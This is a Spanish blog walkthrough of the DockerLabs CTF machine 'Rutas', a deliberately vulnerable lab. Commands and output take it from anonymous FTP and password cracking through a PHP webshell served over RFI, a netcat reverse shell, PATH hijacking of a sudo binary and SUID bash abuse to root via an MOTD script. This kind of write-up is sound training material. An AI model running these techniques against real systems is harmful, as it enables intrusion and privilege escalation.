---
title : "Rutas CTF Walkthrough"
date: 2025-03-12 10:43:55 +0200
categories: [CTF Walkthrough]
tags: [CTF,Walkthrough, DockerLabs, john, zip2john, stegseek, BurpSuite, wfuzz, RFI, Reverse Shell, Path Hijacking, MOTD, SUID, sudo -l]
---

<!-- ![x](/assets/post_img/Rutas) -->
<!-- ```bash
     ```        -->

![Dockerlabs](/assets/post_img/Rutas/logo.png)

**Primera máquina que subo en mucho tiempo y de dificultad media! Vamos a ver que nos depara esta CTF...** 

Al realizar el escaneo de puertos observamos los puertos FTP, SSH y HTTP disponibles. De primeras vemos que detrás hay un Ubuntu, con versiones de servicios suficientemente seguras y con el usuario FTP anónimo sin contraseña. Además, en el FTP encontramos dos archivos interesantes para analizar:
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ rustscan -a 172.17.0.3 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.17.0.3:21
Open 172.17.0.3:22
Open 172.17.0.3:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
|_-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
22/tcp open  ssh     syn-ack OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJRiSYjvuOP/lhuMUNQBFPrbVCw9CT3ke5fcL7EAZYiKaAkR7QVC04V/RdB3z7IxJaoNaJPt0FdQ9lBNziW1NIk=
|   256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKFx7Wd4gMSYBMyAgG/j3zPtwVmihEsr3VRsdFQGr0BA
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos conectamos al FTP con el usuario anónimo y descargamos los dos archivos disponibles. El primer archivo llamado `hola_disfruta` está vacío, así que nos centramos en el otro.

```bash    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ ftp 172.17.0.3 
Connected to 172.17.0.3.
220 (vsFTPd 3.0.5)
Name (172.17.0.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40799|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
226 Directory send OK.
ftp> get hola_disfruta
local: hola_disfruta remote: hola_disfruta
229 Entering Extended Passive Mode (|||11392|)
150 Opening BINARY mode data connection for hola_disfruta (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
ftp> get respeta.zip
local: respeta.zip remote: respeta.zip
229 Entering Extended Passive Mode (|||35068|)
150 Opening BINARY mode data connection for respeta.zip (293 bytes).
100% |***********************************************************************|   293        7.98 MiB/s    00:00 ETA
226 Transfer complete.
293 bytes received in 00:00 (701.30 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ ls
auto_deploy.sh  hola_disfruta  respeta.zip  rutas.tar
                                                                                                                    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ file hola_disfruta 
hola_disfruta: empty
```                                                                                                                    
El segundo archivo es un ZIP protegido con contraseña llamado `respeta.zip`. Al Para desbloquearlo, podemos utilizar herramientas como **fcrackzip** o parecidas. En este caso, empleamos **zip2john** junto a **john**, encontramos la clave `greenday`.    
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ unzip respeta.zip 
Archive:  respeta.zip
[respeta.zip] oculto.txt password: 
password incorrect--reenter: 
   skipping: oculto.txt              incorrect password

┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ zip2john respeta.zip > hash.txt
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 respeta.zip/oculto.txt PKZIP Encr: TS_chk, cmplen=107, decmplen=113, crc=E9450283 ts=8E3B cs=8e3b type=8
                                                                                                                    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
greenday         (respeta.zip/oculto.txt)     
1g 0:00:00:00 DONE (2025-03-03 10:57) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Probamos la contraseña obtenida y logramos extraer el contenido del ZIP llamado `oculto.txt`, e cual contiene un mensaje que nos anima a encontrar una imagen específica en el repositorio de Github [firstatack.github.io](https://github.com/firstatack/firstatack.github.io). 
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ unzip respeta.zip            
Archive:  respeta.zip
[respeta.zip] oculto.txt password: 
  inflating: oculto.txt              
                                                                                                                    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ ls
auto_deploy.sh  hash.txt  hola_disfruta  oculto.txt  respeta.zip  rutas.tar
                                                                                                                    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ cat oculto.txt   
Consigue la imagen crackpass.jpg
firstatack.github.io
sin fuzzing con logica y observando la sacaras ,muy rapido
```
Para encontrar la imagen, simplemente uso el buscador de archivos de Github e indico el nombre `crackpass.png`. Simplemente se descarga la imagen para investigar que pistas nos puede ofrecer.

![Img-search](/assets/post_img/Rutas/1.png)

![Img-download](/assets/post_img/Rutas/2.png)

De primeras sospecho que podría haber esteganografía oculta, por lo que podríamos utilizar herramientas como **strings** o **exiftool** para analizar el archivo en busca de pistas. Sin dar en el clavo, me animo a probar **stegseek**, que encuentra un ZIP por detrás el cual descomprimimos y resulta tener un archivo llamado `pass` con unas credenciales muy útiles para después:
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ stegseek crackpass.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "passwd.zip".
[i] Extracting to "crackpass.jpg.out".

┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ mv crackpass.jpg.out passwd.zip
                                                                                                                    
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ unzip passwd.zip 
Archive:  passwd.zip
 extracting: pass                    

┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ cat pass 
hackeada:denuevo
```

Luego probamos de enumerar directorios web y archivos que puedan resultar interesantes de investigar. Obsevamos el archivo `index.php` asi que procedemos a visitar el sitio web para ver que nos depara:
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ feroxbuster -u http://172.17.0.3/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x php,sh,txt
                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.3/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sh, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       42l      118w     1116c http://172.17.0.3/index.php
200      GET       22l      105w     5952c http://172.17.0.3/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://172.17.0.3/
[#####>--------------] - 15s   256909/882220  35s     found:3       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_172_17_0_3_-1740996464.state ...
[#####>--------------] - 15s   257601/882220  35s     found:3       errors:0      
[#####>--------------] - 15s   257420/882184  17582/s http://172.17.0.3/                                                                                                                                                                
```

En la pàgina web se observan tres enlaces, de los cuáles nos interesan únicamente `trackedvuln.dl` y `vuldndb.com`, ya que no están siendo resueltos por el DNS. Para solucionarlo, los añadimos al archivo **/etc/hosts**, asignándoles la dirección IP **172.17.0.3** para que puedan resolverse correctamente.

![Links](/assets/post_img/Rutas/3.png)

```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ sudo cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3  vulndb.com trackedvuln.dl 
```

Continuamos con el proceso de enumeración de directorios y archivos en el dominio `trackedvuln.dl`. Sin embargo, la respuesta no es muy positiva, ya que obtenemos varios errores. Para comprender la causa, accedemos a la página en busca de respuestas.
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ feroxbuster -u http://trackedvuln.dl/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x php,sh,txt
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://trackedvuln.dl/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sh, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       14l       54w      461c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c http://trackedvuln.dl/http%3A%2F%2Fwww
404      GET        9l       31w      276c http://trackedvuln.dl/http%3A%2F%2Fwww.php
404      GET        9l       31w      276c http://trackedvuln.dl/http%3A%2F%2Fwww.sh
404      GET        9l       31w      276c http://trackedvuln.dl/http%3A%2F%2Fwww.txt
[##>-----------------] - 10s   118138/882184  64s     found:4       errors:1      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_trackedvuln_dl_-1741172648.state ...
[##>-----------------] - 10s   118428/882184  64s     found:4       errors:1      
[##>-----------------] - 10s   118244/882184  11311/s http://trackedvuln.dl/ 
```
Al acceder a la pàgina web observamos que hay una entrada de autenticación de Apache, siendo la posible razón del output poco eficiente del fuzzing. Teniendo unas credenciales extraídas de la estenografía, se me ocurre acceder con el usuario `hackeada` y la contraseña `denuevo`.   

![Auth](/assets/post_img/Rutas/4.png)

Tras acceder con éxito a `trackedvuln.dl`, analizamos la seguridad de las peticiones con BurpSuite y observamos que el encabezado `Authorization` utiliza `Basic`, revelando el string de autenticación en Base64.

![Burp-Decode-Base64](/assets/post_img/Rutas/5.png)

Tras detectar esta vulnerabilidad, añadimos el parámetro `-H` al comando de **feroxbuster** para incluir cabeceras HTTP personalizadas. Específicamente, usamos la cabecera `Authorization` para realizar fuzzing autenticado y evitar restricciones. En el resultado nos encontramos con un `index.php` que consultamos para ver que ofrece.
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ feroxbuster -u http://trackedvuln.dl/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -x php,sh,txt -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw=="
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://trackedvuln.dl/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, sh, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      105w     5952c http://trackedvuln.dl/icons/ubuntu-logo.png
200      GET       39l       86w      901c http://trackedvuln.dl/index.php
200      GET      362l      961w    10672c http://trackedvuln.dl/
[####>---------------] - 58s   217191/882208  3m      found:3       errors:1      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_trackedvuln_dl_-1741172729.state ...
[####>---------------] - 58s   217313/882208  3m      found:3       errors:1      
[####>---------------] - 58s   217116/882184  3767/s  http://trackedvuln.dl/
```

Como no encontramos nada en un principio, seguimos con la metodología probando con **wfuzz** con el objetivo de encontrar parámetros vulnerables a inclusión de archivos locales (LFI). En el resultado nos indica que `love` es un paràmetro vàlido para obtener el contenido del archivo /etc/passwd en este ejemplo:
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ wfuzz --hw=86 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://trackedvuln.dl/index.php?FUZZ=/etc/passwd" -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw=="
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trackedvuln.dl/index.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000002045:   200        39 L     104 W      1071 Ch     "love"                                             
```

El resultado no es el esperado ya que la pàgina nos indica que un LFI no funcionara, aunque a parte, deberiamos tener en cuenta el directorio **tmp/**. 

![LFI](/assets/post_img/Rutas/6.png)

Asi que se me ocurre probar un RFI levantando un servidor HTTP con **python3**. En este servidor se encuentra una Reverse Shell preparada por si resulta ser vulnerable a RFI.
```bash 
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ cat rev.php
<?php system($_GET[“cmd”]);?>

┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ python3 -m http.server 8000


┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ nc -nlvp 1234
listening on [any] 1234 …
```
Al poder acceder desde la URL al servidor levantado con **python3** desde mi màquina local, vemos que es muy probable ser vulnerable a inclusión de archivos remotos (RFI).

![RFI](/assets/post_img/Rutas/7.png)

Asi que usando la Reverse Shell que tenemos en el servidor **python3**, establecemos la Reverse Shell desde la URL:  

![URL-Reverse-Shell](/assets/post_img/Rutas/8.png)

Vemos que en el Netcat que hemos dejado en escucha, se ha realizado la Reverse Shell correctamente con el usuario **www-data**. Después de tratar la TTY para trabajar cómodamente, vemos que ejecutando un `sudo -l` hay un binario llamado **/usr/bin/baner** que puede ejecutar el usuario **norberto** con privilegios de sudo, sin necesidad de introducir contraseña.   
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.3] 50114
bash: cannot set terminal process group (36): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.2$ ^Z
zsh: suspended  nc -nlvp 1234
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ stty raw -echo; fg
[1]  + continued  nc -nlvp 1234
                               reset xterm

bash-5.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.2$ export TERM=xterm
bash-5.2$ stty rows 52 columns 236
bash-5.2$ export PS1='\u@\h:\w\$ '
www-data@c4c8ec0e7c35:/var/www/irresistible/public$ sudo -l
Matching Defaults entries for www-data on c4c8ec0e7c35:
    env_reset, mail_badpass, secure_path=/tmp\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on c4c8ec0e7c35:
    (norberto) NOPASSWD: /usr/bin/baner
```

Aprovechamos esta vulnerabilidad y ejecutamos el binario, obteniendo un output curioso. Observamos que el comando head se ejecuta sobre el archivo **/etc/passwd**, tanto con ruta absoluta como relativa. El hecho de que pueda llamarse con ruta relativa nos resulta interesante para realizar un **Path Hijacking**.
```bash
www-data@c4c8ec0e7c35:/var/www/irresistible/public$ sudo -u norberto /usr/bin/baner 
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Así que procedemos a crear nuestro archivo llamado **head** situado en **/tmp**, para que el propio binario **/usr/bin/baner** encuentre mas rápidamente nuestro script en el $PATH . Este archivo nos otorgarà el control del usuario **norberto** por el comando `bash -p`.
```bash
www-data@c4c8ec0e7c35:/var/www/irresistible/public$ cd /tmp
www-data@c4c8ec0e7c35:/tmp$ nano head
www-data@c4c8ec0e7c35:/tmp$ cat head 
#!/bin/bash
bash -p
www-data@c4c8ec0e7c35:/tmp$ chmod +x head
www-data@c4c8ec0e7c35:/tmp$ sudo -u norberto /usr/bin/baner
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:

bash-5.2# whoami
norberto
```

Buscando archivos que nos puedan revelar algo, encontramos un directorio llamado **.-/** en la home de **norberto**. En este directorio hay un archivo oculto llamado **.miscredenciales** el cual nos deja un mensaje en braille.
```bash
norberto@c4c8ec0e7c35:~$ ls -la
total 40
drwxr-x--- 1 norberto norberto 4096 Mar  3 21:28 .
drwxrwxr-x 1 norberto norberto 4096 Jul 13  2024 .-
drwxr-xr-x 1 root     root     4096 Jul  9  2024 ..
-rw------- 1 norberto norberto  483 Mar  5 20:30 .bash_history
-rw-r--r-- 1 norberto norberto  220 Jul  9  2024 .bash_logout
-rw-r--r-- 1 root     root     3789 Jul 12  2024 .bashrc
drwx------ 2 norberto norberto 4096 Jul 10  2024 .cache
drwxrwxr-x 3 norberto norberto 4096 Jul 10  2024 .local
-rw-r--r-- 1 norberto norberto  807 Jul  9  2024 .profile
norberto@c4c8ec0e7c35:~$ cd .-
norberto@c4c8ec0e7c35:~/.-$ ls -la
total 12
drwxrwxr-x 1 norberto norberto 4096 Jul 13  2024 .
drwxr-x--- 1 norberto norberto 4096 Mar  3 21:28 ..
-rw-rw-r-- 1 norberto norberto  181 Jul 13  2024 .miscredenciales
norberto@c4c8ec0e7c35:~/.-$ cat .miscredenciales 
Hasta aqui no sirvio mi password

⠏⠗⠁⠉⠞⠊⠉⠁⠉⠗⠑⠁⠝⠙⠕⠗⠑⠞⠕⠎

Debes tenerlo a mano te sera util
Usa mis pass para escalar
feliz hack de firstatack
```
Le pasamos el texto en braille a un decoder y nos dará el resultado **practicandoretos**, una posible contraseña importante del sistema.

![Braile-Decode](/assets/post_img/Rutas/9.png)

Después de inspeccionar directorios y archivos sin encontrar nada, listamos los binarios y librerias con permisos SUID de root sin mucha suerte, pero listandolos con el usuario **maria** observamos **/usr/lib/bash**. Nos aprovechamos lanzando una terminal privilegiada. 
```bash
norberto@c4c8ec0e7c35:~/.-$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/bash
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
norberto@c4c8ec0e7c35:~/.-$ find / -perm -4000 -user maria 2>/dev/null
/usr/lib/bash

norberto@c4c8ec0e7c35:~/.-$ /usr/lib/bash -p
maria@c4c8ec0e7c35:~/.-$ whoami
maria
```

Accediendo a la **home/** de **maria**, encontramos un archivo oculto llamado **.mipass** donde encontramos las credenciales **maria:asientiendesmejor**.
```bash
maria@c4c8ec0e7c35:~/.-$ cd /home/maria/
maria@c4c8ec0e7c35:/home/maria$ ls -la
total 40
drwxr-x--- 1 maria maria 4096 Mar  5 19:34 .
drwxr-xr-x 1 root  root  4096 Jul  9  2024 ..
-rw------- 1 maria maria  138 Mar  5 19:34 .bash_history
-rw-r--r-- 1 maria maria  220 Jul  9  2024 .bash_logout
-rw-r--r-- 1 maria maria 3789 Jul 11  2024 .bashrc
drwx------ 2 maria maria 4096 Mar  3 21:32 .cache
drwxrwxr-x 3 maria maria 4096 Jul 10  2024 .local
-rw-rw-r-- 1 maria maria   45 Jul 13  2024 .mipass
-rw-r--r-- 1 maria maria  807 Jul  9  2024 .profile
maria@c4c8ec0e7c35:/home/maria$ cat .mipass
maria:asientiendesmejor
Donde podre escribir
```

Teniendo las credenciales de **maria**, probamos de acceder via SSH en vez de seguir trabajando en la Reverse Shell, y nos encontramos con un MOTD personalizado. Esto significa que hay un archivo que se esta ejecutando nada mas iniciar sesión con **maria**, asi que veamos si añadiendo permisos SUID a **/bin/bash** mediante el fichero `/etc/update-motd.d/00-header` podemos conseguir una shell como root.
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ ssh maria@172.17.0.3        
maria@172.17.0.3's password: 
SORPRESA


FELIZ HACK


 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  _   _   _   _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
( F | I | R | S | T | A | T | A | C | K )
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
  _   _   _   _   _     _   _   _   _ 
 / \ / \ / \ / \ / \   / \ / \ / \ / \ 
( f | e | l | i | z ) ( h | a | c | k )
 \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

maria@c4c8ec0e7c35:~$ ls /etc/update-motd.d/
00-header  10-help-text  50-motd-news  60-unminimize

maria@c4c8ec0e7c35:~$ echo 'chmod u+s /bin/bash' >> /etc/update-motd.d/00-header
maria@c4c8ec0e7c35:/etc/update-motd.d$ exit
logout
Connection to 172.17.0.3 closed.
```

Finalmente, al volver a iniciar sesión con **maria**, ¡observamos que ejecutando un `bash -p` conseguimos elevar nuestros privilegios tomando el control de root!
```bash
┌──(kali㉿kali)-[~/HackingMachines/DockerLabs/Medio/rutas]
└─$ ssh maria@172.17.0.3
maria@172.17.0.3's password: 
SORPRESA


FELIZ HACK


 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  _   _   _   _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
( F | I | R | S | T | A | T | A | C | K )
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
  _   _   _   _   _     _   _   _   _ 
 / \ / \ / \ / \ / \   / \ / \ / \ / \ 
( f | e | l | i | z ) ( h | a | c | k )
 \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
Last login: Mon Mar  3 21:32:05 2025 from 172.17.0.1
-bash-5.2$ whoami
maria
-bash-5.2$ bash -p
bash-5.2# whoami
root
```
¡Hemos completado la máquina! Ha sido muy interesante ir resolviendo esta CTF poco a poco y aunque sea poco realista, considero que va muy bien para tener en cuenta que hay una infinidad de vectores de ataque que aprender. 

![Dockerlabs](/assets/post_img/Rutas/ctf.png)


Hasta la próxima,

~loh♡.

   



